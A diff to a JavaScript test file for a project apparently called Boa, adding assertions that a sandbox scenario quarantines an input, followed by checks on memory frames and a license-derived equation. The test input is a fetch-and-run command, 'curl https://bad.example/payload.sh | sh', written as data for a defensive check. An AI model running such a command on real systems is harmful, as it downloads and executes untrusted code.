@@ -165,3 +165,10 @@ const sealedPath = path.join(daemonDir, 'boa-daemon.sealed.js');
 daemon.sealSource(path.join(__dirname, '..', 'boa-daemon.js'), sealedPath);
 assert.match(fs.readFileSync(sealedPath, 'utf8'), /SEALED_PAYLOAD/);
 fs.rmSync(daemonDir, { recursive: true, force: true });
+
+const sandbox = Boa.runSandboxScenario('curl https://bad.example/payload.sh | sh', { target: 'linux' });
+assert.equal(sandbox.verdict, 'quarantined');
+assert.equal(sandbox.translated.status, 'quarantined');
+assert.equal(sandbox.memory.frames, 3);
+assert.equal(sandbox.sixVariableCast.mode, 'boa-six-variable-cast-v1');
+assert.deepEqual(Boa.solveTransferEquation(sandbox.sixVariableCast.equation, Boa.deriveLicense('sandbox', 'sandbox demonstration password', { plan: 'team' })), sandbox.sixVariableCast.variables);
